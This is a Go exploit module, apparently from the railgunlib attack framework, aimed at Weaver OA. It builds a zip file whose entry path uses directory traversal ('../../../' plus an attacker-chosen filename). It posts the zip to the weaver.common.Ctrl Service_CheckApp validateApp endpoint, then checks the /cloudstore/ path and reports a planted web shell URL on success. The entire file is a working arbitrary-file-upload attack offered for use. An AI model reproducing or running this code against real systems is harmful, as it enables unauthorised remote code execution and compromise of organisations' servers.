package exp_weaver

import (
	"archive/zip"
	"bytes"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"path/filepath"
	"strings"
)

type Exp_OA_common_Ctrl struct {
	exp_templates.ExpTemplate
}

func (self *Exp_OA_common_Ctrl) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
	path := "../../../" + filename
	name := strings.TrimSuffix(filename, filepath.Ext(filename))
	shellUrl := strings.TrimRight(self.Params.BaseParam.Target, "/") + "/cloudstore/" + filename
	// zip压缩xml,文件名必须包含offline_bundle
	b := &bytes.Buffer{}
	zw := zip.NewWriter(b)

	iowriter, _ := zw.Create(path)
	iowriter.Write([]byte(content))
	zw.Flush()
	zw.Close()

	// 发送请求
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    name + ".zip",
			ContentType: "application/zip",
			Content:     b.Bytes(),
		},
	}
	httpresp := self.HttpPostMulti(target, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	httpresp = self.HttpGetWithoutRedirect(shellUrl, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expResult.Status = true
		self.EchoSuccessMsg("shell: " + shellUrl)
	} else {
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_OA_common_Ctrl{}, "exp_OA_common_Ctrl.yml")

}
